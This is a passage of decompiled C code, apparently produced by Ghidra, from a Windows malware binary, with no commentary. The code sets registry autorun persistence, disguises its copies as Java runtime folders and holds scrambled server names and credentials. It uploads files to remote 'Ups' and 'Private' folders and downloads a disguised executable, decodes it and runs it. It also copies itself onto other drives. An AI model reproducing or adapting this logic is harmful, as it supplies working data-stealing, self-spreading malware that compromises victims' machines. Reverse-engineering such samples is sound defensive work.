  FUN_004035b0((int)local_36,0x40b326,'\0');
  pcVar2 = (code *)(*DAT_0040d000)(iVar1,local_36);
  if (pcVar2 != (code *)0x0) {
    FUN_004035b0((int)local_36,0x40b321,'\0');
    (*pcVar2)(0,local_36,param_1,0,0,5);
    if (iVar1 != 0) {
      (*DAT_0040d008)(iVar1);
    }
    pcVar2 = (code *)0x1;
  }
  return pcVar2;
}



bool FUN_00401d60(undefined4 param_1,char *param_2)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  bool bVar4;
  undefined local_198 [200];
  char local_d0 [200];
  undefined4 local_8;
  
  puVar1 = FUN_00403d00(0x400);
  FUN_004035b0((int)local_d0,0x40b408,'\0');
  iVar2 = (*DAT_0040d00c)(local_d0);
  if (iVar2 == 0) {
    iVar2 = (*DAT_0040d004)(local_d0);
  }
  FUN_004035b0((int)local_d0,0x40b3fa,'\0');
  DAT_0040d064 = (code *)(*DAT_0040d000)(iVar2,local_d0);
  FUN_004035b0((int)local_d0,0x40b3eb,'\0');
  DAT_0040d068 = (code *)(*DAT_0040d000)(iVar2,local_d0);
  FUN_004035b0((int)local_d0,0x40b3df,'\0');
  DAT_0040d074 = (code *)(*DAT_0040d000)(iVar2,local_d0);
  if ((DAT_0040d064 == (code *)0x0) || (DAT_0040d068 == (code *)0x0)) {
    bVar4 = false;
  }
  else {
    FUN_004035b0((int)local_198,0x40b315,'\0');
    FUN_004035b0((int)local_d0,(int)local_198,'\0');
    FUN_00403780(local_d0,param_2);
    FUN_00403d60((int)puVar1,&DAT_0040b310);
    FUN_004035b0((int)local_198,0x40b29b,'\0');
    FUN_004035b0((int)local_d0,(int)local_198,'\0');
    iVar3 = 0;
    do {
      if (local_d0[iVar3] == '.') {
        local_d0[iVar3] = '\\';
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < 0x96);
    (*DAT_0040d064)(0x80000002,local_d0,0,0xf003f,&local_8);
    iVar3 = -1;
    do {
      iVar3 = iVar3 + 1;
    } while (*(char *)((int)puVar1 + iVar3) != '\0');
    iVar3 = (*DAT_0040d068)(local_8,param_1,0,1,puVar1,iVar3);
    bVar4 = iVar3 == 0;
    (*DAT_0040d074)(local_8);
    FUN_004040b0(puVar1);
    if (iVar2 != 0) {
      (*DAT_0040d008)(iVar2);
    }
  }
  return bVar4;
}



void FUN_00401f40(undefined4 param_1)

{
  int iVar1;
  int iVar2;
  undefined local_9e [150];
  undefined4 local_8;
  
  FUN_004035b0((int)local_9e,0x40b408,'\0');
  iVar1 = (*DAT_0040d00c)(local_9e);
  if (iVar1 == 0) {
    iVar1 = (*DAT_0040d004)(local_9e);
  }
  FUN_004035b0((int)local_9e,0x40b28b,'\0');
  DAT_0040d06c = (code *)(*DAT_0040d000)(iVar1,local_9e);
  FUN_004035b0((int)local_9e,0x40b3df,'\0');
  DAT_0040d074 = (code *)(*DAT_0040d000)(iVar1,local_9e);
  FUN_004035b0((int)local_9e,0x40b27b,'\0');
  DAT_0040d070 = (code *)(*DAT_0040d000)(iVar1,local_9e);
  if ((DAT_0040d06c != (code *)0x0) && (DAT_0040d070 != (code *)0x0)) {
    iVar2 = (*DAT_0040d06c)(0x80000002,&DAT_0040e228,0,0,0,0xf003f,0,&local_8,0);
    if (iVar2 == 0) {
      (*DAT_0040d070)(local_8,param_1);
      if (DAT_0040d074 != (code *)0x0) {
        (*DAT_0040d074)(local_8);
      }
    }
    iVar2 = (*DAT_0040d06c)(0x80000001,&DAT_0040e228,0,0,0,0xf003f,0,&local_8,0);
    if (iVar2 == 0) {
      (*DAT_0040d070)(local_8,param_1);
      if (DAT_0040d074 != (code *)0x0) {
        (*DAT_0040d074)(local_8);
      }
    }
    if (iVar1 != 0) {
      (*DAT_0040d008)(iVar1);
    }
  }
  return;
}



undefined4 FUN_004020b0(void)

{
  char local_218 [512];
  undefined local_18 [20];
  
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\RLT6987");
  FUN_00401580(local_218);
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\RLT6988");
  FUN_00401580(local_218);
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\RLT6989");
  FUN_00401580(local_218);
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\RLT6990");
  FUN_00401580(local_218);
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\RLN06527");
  FUN_00401580(local_218);
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\RLN06530");
  FUN_00401580(local_218);
  FUN_004035b0((int)local_18,0x40b236,'\0');
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-01");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-02");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-03");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-04");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-05");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-06");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-07");
  FUN_00401580(local_218);
  (*DAT_0040d038)(local_18,local_218,0x200);
  FUN_00403780(local_218,"\\Java\\jre-08");
  FUN_00401580(local_218);
  FUN_004035b0((int)local_218,0x40b1bb,'\0');
  FUN_00401f40(local_218);
  FUN_004035b0((int)local_218,0x40b1a7,'\0');
  FUN_00401f40(local_218);
  FUN_004035b0((int)local_218,0x40b193,'\0');
  FUN_00401f40(local_218);
  FUN_004035b0((int)local_218,0x40b17f,'\0');
  FUN_00401f40(local_218);
  FUN_004035b0((int)local_218,0x40b16b,'\0');
  FUN_00401f40(local_218);
  FUN_004035b0((int)local_218,0x40b157,'\0');
  FUN_00401f40(local_218);
  return 1;
}



uint * FUN_00402470(LPCSTR param_1)

{
  uint *puVar1;
  undefined8 uVar2;
  
  puVar1 = (uint *)FUN_004040f0(param_1,"rb");
  if (puVar1 != (uint *)0x0) {
    FUN_00404120(puVar1,0,2);
    uVar2 = FUN_00404150(puVar1);
    DAT_0040e2c0 = (uint *)uVar2;
    FUN_00404160(puVar1);
    DAT_0040e2c4 = (undefined8 *)FUN_00403d00((int)DAT_0040e2c0 + 1);
    FUN_00404180(DAT_0040e2c4,1,DAT_0040e2c0,puVar1);
    FUN_004042c0(puVar1);
    *(undefined *)((int)DAT_0040e2c0 + (int)DAT_0040e2c4) = 0;
    puVar1 = DAT_0040e2c0;
  }
  return puVar1;
}



// WARNING: Type propagation algorithm not settling

void FUN_00402500(undefined4 param_1)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  char local_162 [20];
  char local_14e [20];
  char local_13a [10];
  char local_130;
  
  puVar4 = &DAT_0040da18;
  puVar5 = (undefined4 *)&local_130;
  for (iVar2 = 0x4b; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar5 = puVar5 + 1;
  }
  (*DAT_0040d02c)(300,&local_130);
  if ((local_130 == 'A') || (local_130 == 'a')) {
    puVar4 = (undefined4 *)((int)&local_130 + 4);
  }
  else {
    puVar4 = (undefined4 *)&local_130;
  }
  for (; *(char *)puVar4 != '\0'; puVar4 = puVar4 + 1) {
    iVar2 = (*DAT_0040d028)(puVar4);
    if ((iVar2 == 2) || (iVar2 == 3)) {
      FUN_00403d60((int)local_14e,&DAT_0040b310);
      pcVar3 = local_14e;
      iVar2 = -(int)pcVar3;
      do {
        cVar1 = *pcVar3;
        pcVar3[(int)(local_162 + iVar2)] = cVar1;
        pcVar3 = pcVar3 + 1;
      } while (cVar1 != '\0');
      FUN_004035b0((int)local_13a,0x40b14e,'\0');
      FUN_00403780(local_162,local_13a);
      iVar2 = (*DAT_0040d044)(param_1,local_162,1);
      if (iVar2 != 0) {
        (*DAT_0040d030)(local_14e,0);
        (*DAT_0040d01c)(local_14e,2);
      }
    }
  }
  return;
}



void FUN_00402610(void)

{
  int iVar1;
  undefined1 *puVar2;
  undefined *puVar3;
  undefined local_41a [3];
  undefined local_417;
  undefined local_21a [261];
  undefined local_115 [261];
  undefined4 local_10;
  undefined4 local_c;
  uint local_8;
  
  puVar2 = &DAT_0040db44;
  puVar3 = local_115;
  for (iVar1 = 0x105; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  puVar2 = &DAT_0040dc49;
  puVar3 = local_21a;
  for (iVar1 = 0x105; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_8 = 0;
  local_c = 0;
  local_10 = 0;
  (*DAT_0040d03c)(local_41a,0x200);
  local_417 = 0;
  iVar1 = (*DAT_0040d040)(local_41a,local_115,0x105,&local_8,&local_c,&local_10,local_21a,0x105);
  if (iVar1 != 0) {
    FUN_00404400(local_8,&DAT_0040e2c8,0x10);
  }
  DAT_0040e2fc = (char)((ulonglong)local_8 % 10) + '0';
  DAT_0040e2fd = 0x5f;
  DAT_0040e2fe = 0;
  return;
}



uint * FUN_004026e0(void)

{
  char cVar1;
  uint *puVar2;
  char *pcVar3;
  int iVar4;
  char local_218 [512];
  char local_18 [20];
  
  (*DAT_0040d03c)(local_218,0x200);
  FUN_00403780(local_218,"\\");
  FUN_004035b0((int)local_18,0x40b142,'\0');
  FUN_00403780(local_218,local_18);
  puVar2 = FUN_00402470(local_218);
  if (puVar2 != (uint *)0x0) {
    DAT_0040e228 = '\0';
    iVar4 = 0;
    if (0 < DAT_0040e2c0) {
      do {
        if ((((*(char *)(iVar4 + (int)DAT_0040e2c4) == 'M') &&
             (*(char *)(iVar4 + 5 + (int)DAT_0040e2c4) == 's')) &&
            (*(char *)(iVar4 + 8 + (int)DAT_0040e2c4) == 't')) &&
           ((*(char *)(iVar4 + 0xc + (int)DAT_0040e2c4) == 'n' &&
            (*(char *)(iVar4 + 0xf + (int)DAT_0040e2c4) == 'w')))) {
          FUN_004035b0(0x40e228,0x40b114,'\0');
          FUN_004035b0((int)local_218,0x40e228,'\0');
          FUN_004035b0(0x40e228,(int)local_218,'\0');
          FUN_004044c0(&DAT_0040e231,(char *)(iVar4 + (int)DAT_0040e2c4),0x11);
          break;
        }
        iVar4 = iVar4 + 1;
      } while (iVar4 < DAT_0040e2c0);
    }
    FUN_004040b0(DAT_0040e2c4);
    if (DAT_0040e228 == '\0') {
      puVar2 = (uint *)0x0;
    }
    else {
      iVar4 = 0;
      do {
        if ((&DAT_0040e228)[iVar4] == '.') {
          (&DAT_0040e228)[iVar4] = 0x5c;
        }
        iVar4 = iVar4 + 1;
      } while (iVar4 < 0x2d);
      FUN_004035b0((int)local_218,0x40d093,'\0');
      pcVar3 = local_218;
      iVar4 = (int)s_aavd9apeJUt_0040d093 - (int)pcVar3;
      do {
        cVar1 = *pcVar3;
        pcVar3[iVar4] = cVar1;
        pcVar3 = pcVar3 + 1;
      } while (cVar1 != '\0');
      FUN_004035b0((int)local_218,0x40d09f,'\0');
      pcVar3 = local_218;
      iVar4 = (int)s_JUthnaac9uvdSdSapee_0040d09f - (int)pcVar3;
      do {
        cVar1 = *pcVar3;
        pcVar3[iVar4] = cVar1;
        pcVar3 = pcVar3 + 1;
      } while (cVar1 != '\0');
      puVar2 = (uint *)0x1;
    }
  }
  return puVar2;
}



undefined4 FUN_00402880(undefined4 param_1,LPCSTR param_2)

{
  char cVar1;
  int iVar2;
  bool bVar3;
  int iVar4;
  uint *puVar5;
  uint *puVar6;
  int iVar8;
  undefined3 extraout_var;
  LPCSTR pCVar9;
  char *pcVar10;
  CHAR local_804;
  char acStack_803 [1023];
  CHAR local_404 [1024];
  uint *puVar7;
  
  iVar4 = (*DAT_0040d044)();
  if ((iVar4 != 0) && (puVar5 = (uint *)FUN_004040f0(param_2,"ab"), puVar5 != (uint *)0x0)) {
    puVar7 = (uint *)0xffffffff;
    do {
      puVar6 = (uint *)((int)puVar7 + 1);
      pcVar10 = (char *)((int)puVar7 + 0x40e2c9);
      puVar7 = puVar6;
    } while (*pcVar10 != '\0');
    FUN_00404500((undefined8 *)&DAT_0040e2c8,1,puVar6,puVar5);
    FUN_004042c0(puVar5);
  }
  pCVar9 = param_2;
  do {
    cVar1 = *pCVar9;
    pCVar9[(int)(&local_804 + -(int)param_2)] = cVar1;
    pCVar9 = pCVar9 + 1;
  } while (cVar1 != '\0');
  iVar4 = -1;
  do {
    iVar8 = iVar4 + 1;
    iVar2 = iVar4 + 1;
    iVar4 = iVar8;
  } while ((&local_804)[iVar2] != '\0');
  for (; (&local_804)[iVar8 + -1] != '\\'; iVar8 = iVar8 + -1) {
  }
  pcVar10 = "UF";
  do {
    cVar1 = *pcVar10;
    (&stack0xffbf46ee + iVar8)[(int)pcVar10] = cVar1;
    pcVar10 = pcVar10 + 1;
  } while (cVar1 != '\0');
  GetLocaleInfoA(0x800,0x1002,local_404,0x32);
  puVar5 = (uint *)FUN_004040f0(&local_804,"w");
  if (puVar5 != (uint *)0x0) {
    FUN_00404660((int)puVar5,&DAT_0040b109);
    FUN_004042c0(puVar5);
  }
  bVar3 = FUN_00401d60(param_2,s_aavd9apeJUt_0040d093);
  if ((CONCAT31(extraout_var,bVar3) != 0) &&
     (iVar4 = FUN_00401740((int)param_2,s_JUthnaac9uvdSdSapee_0040d09f), iVar4 != 0)) {
    FUN_004020b0();
  }
  if (DAT_0040d0be == '\0') {
    FUN_00401cc0(param_2);
  }
  return 1;
}



undefined4 FUN_004029c0(byte *param_1)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  undefined4 local_12c [2];
  int local_124;
  byte local_108 [260];
  
  uVar1 = (*DAT_0040d048)(2,0);
  local_12c[0] = 0x128;
  iVar2 = (*DAT_0040d04c)();
  iVar3 = (*DAT_0040d050)(uVar1,local_12c);
  while( true ) {
    if (iVar3 == 0) {
      (*DAT_0040d058)(uVar1);
      return 0;
    }
    if ((iVar2 != local_124) && (iVar3 = FUN_00404680(local_108,param_1), iVar3 == 0)) break;
    iVar3 = (*DAT_0040d054)(uVar1,local_12c);
  }
  (*DAT_0040d058)(uVar1);
  return 1;
}



void FUN_00402a50(int param_1,byte *param_2)

{
  int iVar1;
  
  iVar1 = FUN_004029c0(param_2);
  if (iVar1 == 0) {
    if (DAT_0040d0bf == '\0') {
      FUN_00401740(param_1,s_JUthnaac9uvdSdSapee_0040d09f);
      DAT_0040d0bf = '\x01';
    }
  }
  else if (DAT_0040d0bf == '\x01') {
    FUN_00401f40(s_JUthnaac9uvdSdSapee_0040d09f);
    DAT_0040d0bf = '\0';
  }
  return;
}



void FUN_00402aa0(void)

{
  byte bVar1;
  bool bVar2;
  char cVar7;
  int iVar3;
  uint *puVar4;
  uint uVar5;
  HANDLE hFile;
  int iVar6;
  byte *pbVar8;
  byte *pbVar9;
  char *pcVar10;
  char local_d45;
  char local_d42;
  char local_d41;
  char local_d3a [50];
  char local_d08 [50];
  char local_cd6 [50];
  char local_ca4 [50];
  char local_c72 [50];
  char local_c40 [50];
  char local_c0e [50];
  char local_bdc [50];
  char local_baa [350];
  undefined local_a4c [24];
  _SYSTEMTIME local_a34;
  _SYSTEMTIME local_a24;
  _FILETIME local_a14;
  undefined8 local_a0c;
  byte local_a04 [512];
  char local_804 [512];
  byte local_604;
  char local_603;
  char local_602;
  byte local_601 [5];
  char local_5fc;
  char local_5fb;
  char local_5fa;
  undefined local_5f9;
  byte local_404 [512];
  byte local_204 [512];
  
  FUN_00401150();
  (*DAT_0040d034)();
  iVar3 = -1;
  do {
    iVar6 = iVar3;
    iVar3 = iVar6 + 1;
  } while (s_New_Folder_0040d0b3[iVar6 + 1] != '\0');
  iVar3 = FUN_004046d0(local_601,(byte *)s_New_Folder_0040d0b3,iVar6 + 1);
  if (iVar3 == 0) {
    local_601[iVar6 + 1] = 0;
    (*DAT_0040d030)();
    (*DAT_0040d01c)();
    FUN_00401cc0(&local_604);
    (*DAT_0040d038)();
    FUN_004035b0((int)local_804,0x40b0f9,'\0');
    FUN_00403780((char *)&local_604,"\\");
    FUN_00403780((char *)&local_604,s_jre_09_0040d08c);
    FUN_00403780((char *)&local_604,local_804);
    (*DAT_0040d034)();
    (*DAT_0040d044)();
    FUN_00401cc0(&local_604);
    FUN_00404720(1);
  }
  FUN_004012e0();
  FUN_00402610();
  puVar4 = FUN_004026e0();
  if (puVar4 == (uint *)0x0) {
    FUN_00404720(1);
  }
  FUN_004035b0((int)&local_604,0x40b236,'\0');
  (*DAT_0040d038)();
  (*DAT_0040d034)();
  FUN_00403780((char *)local_204,"\\Java");
  (*DAT_0040d030)();
  FUN_00403780((char *)local_204,"\\");
  FUN_00403780((char *)local_204,s_jre_09_0040d08c);
  (*DAT_0040d030)();
  FUN_00403780((char *)local_204,"\\bin");
  (*DAT_0040d030)();
  FUN_00403780((char *)local_204,"\\");
  pbVar8 = local_204;
  iVar3 = -(int)pbVar8;
  do {
    bVar1 = *pbVar8;
    pbVar8[(int)(local_a04 + iVar3)] = bVar1;
    pbVar8 = pbVar8 + 1;
  } while (bVar1 != 0);
  local_604 = DAT_0040e233 + 7;
  local_603 = DAT_0040e233 + 0x12;
  local_602 = DAT_0040e233 + 0x10;
  local_601[0] = DAT_0040e233;
  local_601[1] = DAT_0040e233 + 5;
  local_601[2] = DAT_0040e233 + 2;
  local_601[3] = DAT_0040e233 + 1;
  local_601[4] = DAT_0040e233 - 0x35;
  local_5fc = DAT_0040e233 + 2;
  local_5fb = DAT_0040e233 + 0x15;
  local_5fa = DAT_0040e233 + 2;
  local_5f9 = 0;
  FUN_00403780((char *)local_204,(char *)&local_604);
  Sleep(2000);
  pbVar8 = local_404;
  pbVar9 = local_204;
  while( true ) {
    bVar1 = *pbVar9;
    cVar7 = *pbVar8 - bVar1;
    uVar5 = (uint)CONCAT11(cVar7,bVar1);
    if (cVar7 != '\0') break;
    if (bVar1 == 0) goto LAB_00402da7;
    pbVar9 = pbVar9 + 1;
    pbVar8 = pbVar8 + 1;
  }
  uVar5 = (uint)(*pbVar8 < bVar1);
  uVar5 = (1 - uVar5) - (uint)(uVar5 != 0);
LAB_00402da7:
  if (uVar5 != 0) {
    puVar4 = (uint *)FUN_004040f0((LPCSTR)local_204,"rb");
    if (puVar4 == (uint *)0x0) {
      FUN_00402880(local_404,(LPCSTR)local_204);
    }
    else {
      FUN_004042c0(puVar4);
      puVar4 = (uint *)FUN_004040f0((LPCSTR)local_204,"ab");
      if (puVar4 != (uint *)0x0) {
        FUN_004042c0(puVar4);
        FUN_00402880(local_404,(LPCSTR)local_204);
      }
    }
    FUN_00404720(1);
    return;
  }
  FUN_004035b0((int)&local_604,0x40b142,'\0');
  iVar3 = 0;
  do {
    Sleep(500);
    FUN_00402a50((int)local_204,&local_604);
    iVar3 = iVar3 + 1;
  } while (iVar3 < 100);
  if (DAT_0040d0be != '\0') {
    hFile = (HANDLE)(*DAT_0040d05c)();
    GetFileTime(hFile,(LPFILETIME)&local_a0c,(LPFILETIME)0x0,(LPFILETIME)0x0);
    (*DAT_0040d058)();
    FileTimeToLocalFileTime((FILETIME *)&local_a0c,&local_a14);
    FileTimeToSystemTime(&local_a14,&local_a24);
    GetLocalTime(&local_a34);
    if ((((int)((uint)local_a34.wDay - (uint)local_a24.wDay) < 3) &&
        (local_a34.wMonth == local_a24.wMonth)) && (local_a34.wYear == local_a24.wYear)) {
      FUN_00404720(1);
    }
  }
  local_a0c._7_1_ = '\x14';
  local_a0c._6_1_ = '\x14';
  pcVar10 = "ohucgh.firoo.pohhon.";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf41ed)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "ohoohh";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf4226)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "861942753";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf4262)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "poh-nil.t.roisdtgtjoee";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf42ab)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "545159";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf42e4)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "814275";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf431d)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = ".pcpi.trdmftoo";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf435e)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "poilroigtj";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf439b)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  pcVar10 = "814275";
  do {
    cVar7 = *pcVar10;
    (&stack0xffbf43b3)[(int)pcVar10] = cVar7;
    pcVar10 = pcVar10 + 1;
  } while (cVar7 != '\0');
  (*DAT_0040d038)();
  FUN_00403780(local_804,"\\Java\\VirtualDevice.vxd");
  puVar4 = FUN_00402470(local_804);
  local_d45 = '\x03';
  if (puVar4 != (uint *)0x0) {
    FUN_00403650((int)local_804,(int)DAT_0040e2c4,0x200,'\0');
    FUN_004040b0(DAT_0040e2c4);
    pcVar10 = local_804;
    for (local_d41 = '\x03'; local_d41 < '\x05'; local_d41 = local_d41 + '\x01') {
      for (local_d42 = '\0'; local_d42 < '\x03'; local_d42 = local_d42 + '\x01') {
        iVar3 = FUN_00403d60((int)(local_d3a + local_d42 * 0x32 + local_d41 * 0x96),&DAT_0040b109);
        pcVar10 = pcVar10 + iVar3 + 1;
      }
    }
    local_a0c._6_1_ = *pcVar10;
    local_a0c._7_1_ = pcVar10[1];
    local_d45 = '\x05';
  }
  FUN_00403d60((int)local_a4c,(byte *)"%s/Ups/%s%s");
  FUN_00403d60((int)&local_604,&DAT_0040b053);
  bVar2 = false;
  if (local_d45 == '\x05') {
    iVar3 = local_a0c._6_1_ * 0x96;
    iVar3 = FUN_00401ab0(&local_604,local_a4c,(int)(local_d3a + iVar3),(int)(local_d08 + iVar3),
                         (int)(local_cd6 + iVar3));
    bVar2 = false;
    if (iVar3 != 0) {
      bVar2 = true;
    }
  }
  if (!bVar2) {
    for (iVar3 = 0; iVar3 < local_d45; iVar3 = iVar3 + 1) {
      if (iVar3 != local_a0c._6_1_) {
        iVar6 = iVar3 * 0x96;
        iVar6 = FUN_00401ab0(&local_604,local_a4c,(int)(local_d3a + iVar6),(int)(local_d08 + iVar6),
                             (int)(local_cd6 + iVar6));
        if (iVar6 != 0) break;
      }
    }
  }
  FUN_00403d60((int)&local_604,(byte *)"%sPfile.hlp");
  FUN_00403d60((int)local_a4c,(byte *)"%s/Private/%s%s.hlp");
  puVar4 = (uint *)FUN_004040f0((LPCSTR)&local_604,"r");
  if (puVar4 != (uint *)0x0) {
    FUN_004042c0(puVar4);
    bVar2 = false;
    if (local_d45 == '\x05') {
      iVar3 = local_a0c._6_1_ * 0x96;
      iVar3 = FUN_00401ab0(&local_604,local_a4c,(int)(local_d3a + iVar3),(int)(local_d08 + iVar3),
                           (int)(local_cd6 + iVar3));
      bVar2 = false;
      if (iVar3 != 0) {
        bVar2 = true;
      }
    }
    if (!bVar2) {
      for (iVar3 = 0; iVar3 < local_d45; iVar3 = iVar3 + 1) {
        if (iVar3 != local_a0c._6_1_) {
          iVar6 = iVar3 * 0x96;
          iVar6 = FUN_00401ab0(&local_604,local_a4c,(int)(local_d3a + iVar6),
                               (int)(local_d08 + iVar6),(int)(local_cd6 + iVar6));
          if (iVar6 != 0) {
            bVar2 = true;
            break;
          }
        }
      }
    }
    if (bVar2) {
      (*DAT_0040d024)();
    }
  }
  Sleep(2000);
  FUN_00403780((char *)local_a04,"dwntdux.hlp");
  FUN_00403d60((int)local_a4c,(byte *)"%s/Downs/%supdatetdux.hlp");
  bVar2 = false;
  if (local_d45 == '\x05') {
    iVar3 = local_a0c._7_1_ * 0x96;
    iVar3 = FUN_004018a0(local_a04,local_a4c,(int)(local_d3a + iVar3),(int)(local_d08 + iVar3),
                         (int)(local_cd6 + iVar3));
    bVar2 = false;
    if (iVar3 != 0) {
      bVar2 = true;
    }
  }
  if (!bVar2) {
    for (iVar3 = 0; iVar3 < local_d45; iVar3 = iVar3 + 1) {
      if (iVar3 != local_a0c._7_1_) {
        iVar6 = iVar3 * 0x96;
        iVar6 = FUN_004018a0(local_a04,local_a4c,(int)(local_d3a + iVar6),(int)(local_d08 + iVar6),
                             (int)(local_cd6 + iVar6));
        if (iVar6 != 0) break;
      }
    }
  }
  puVar4 = FUN_00402470((LPCSTR)local_a04);
  if (puVar4 != (uint *)0x0) {
    iVar3 = 0;
    if (0 < (int)DAT_0040e2c0) {
      do {
        *(char *)(iVar3 + (int)DAT_0040e2c4) =
             (char)iVar3 + '\x05' + *(char *)(iVar3 + (int)DAT_0040e2c4);
        iVar3 = iVar3 + 1;
      } while (iVar3 < (int)DAT_0040e2c0);
    }
    (*DAT_0040d038)();
    FUN_00403780((char *)local_a04,"\\");
    FUN_004035b0((int)&local_604,0x40b003,'\0');
    FUN_00403780((char *)local_a04,(char *)&local_604);
    if ((*(char *)((int)DAT_0040e2c4 + 1) == 'Z') && (*(char *)DAT_0040e2c4 == 'M')) {
      puVar4 = (uint *)FUN_004040f0((LPCSTR)local_a04,"wb");
      if (puVar4 != (uint *)0x0) {
        FUN_00404500(DAT_0040e2c4,1,DAT_0040e2c0,puVar4);
        FUN_004042c0(puVar4);
      }
    }
    FUN_004040b0(DAT_0040e2c4);
    FUN_00401cc0(local_a04);
  }
  FUN_004035b0((int)&local_604,0x40b142,'\0');
  iVar3 = 0;
  do {
    FUN_00402a50((int)local_204,&local_604);
    if (iVar3 % 0x78 == 0) {
      FUN_00402500(local_204);
    }
    Sleep(500);
    iVar3 = iVar3 + 1;
  } while( true );
}



undefined4 FUN_004035a0(void)

{
  return 0;
}



void FUN_004035b0(int param_1,int param_2,char param_3)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar2 = -1;
  do {
    iVar3 = iVar2;
    iVar2 = iVar3 + 1;
  } while (*(char *)(param_2 + iVar2) != '\0');
  for (iVar2 = 0;
      (((iVar2 < iVar3 + 2 && (cVar1 = *(char *)(iVar2 + param_2), cVar1 != '\0')) &&
       (cVar1 != '\n')) && (cVar1 != '\r')); iVar2 = iVar2 + 1) {
  }
  if (param_3 == '\x01') {
    iVar3 = 3;
    iVar5 = 0;
    iVar4 = iVar3;
    do {
      for (; iVar3 < iVar2; iVar3 = iVar3 + 4) {
        *(undefined *)(iVar5 + param_1) = *(undefined *)(iVar3 + param_2);
        iVar5 = iVar5 + 1;
      }
      iVar3 = iVar4 + -1;
      iVar4 = iVar3;
    } while (-1 < iVar3);
    *(undefined *)(iVar5 + param_1) = 0;
  }
  else {
    iVar3 = 3;
    iVar5 = 0;
    iVar4 = iVar3;
    do {
      for (; iVar3 < iVar2; iVar3 = iVar3 + 4) {
        *(undefined *)(iVar3 + param_1) = *(undefined *)(iVar5 + param_2);
        iVar5 = iVar5 + 1;
      }
      iVar3 = iVar4 + -1;
      iVar4 = iVar3;
    } while (-1 < iVar3);
    *(undefined *)(iVar5 + param_1) = 0;
  }
  FUN_004035a0();
  return;
}



void FUN_00403650(int param_1,int param_2,int param_3,char param_4)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int local_10;
  int local_c;
  int local_8;
  
  iVar2 = 0;
  if (0 < param_3) {
    do {
      *(undefined *)(iVar2 + param_1) = 0;
      iVar2 = iVar2 + 1;
    } while (iVar2 < param_3);
  }
  if (param_4 == '\x01') {
    local_c = 0;
    local_8 = 0;
    iVar2 = 0;
    do {
      iVar3 = 0;
      if (0 < param_3) {
        do {
          if (((int)*(char *)(iVar3 + param_2) & 1 << ((byte)iVar2 & 0x1f)) == 0) {
            *(byte *)(local_8 + param_1) =
                 ~(byte)(1 << ((byte)local_c & 0x1f)) & *(byte *)(local_8 + param_1);
          }
          else {
            *(byte *)(local_8 + param_1) =
                 (byte)(1 << ((byte)local_c & 0x1f)) | *(byte *)(local_8 + param_1);
          }
          local_c = local_c + 1;
          if (local_c == 8) {
            local_8 = local_8 + 1;
            local_c = 0;
          }
          iVar3 = iVar3 + 1;
        } while (iVar3 < param_3);
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 8);
    *(undefined *)(param_3 + param_1) = 0;
  }
  else {
    uVar4 = 0;
    local_10 = 1;
    uVar5 = uVar4;
    if (0 < param_3) {
      do {
        for (; (int)uVar4 < param_3 * 8; uVar4 = uVar4 + param_3) {
          uVar1 = uVar4 & 0x80000007;
          if ((int)uVar1 < 0) {
            uVar1 = (uVar1 - 1 | 0xfffffff8) + 1;
          }
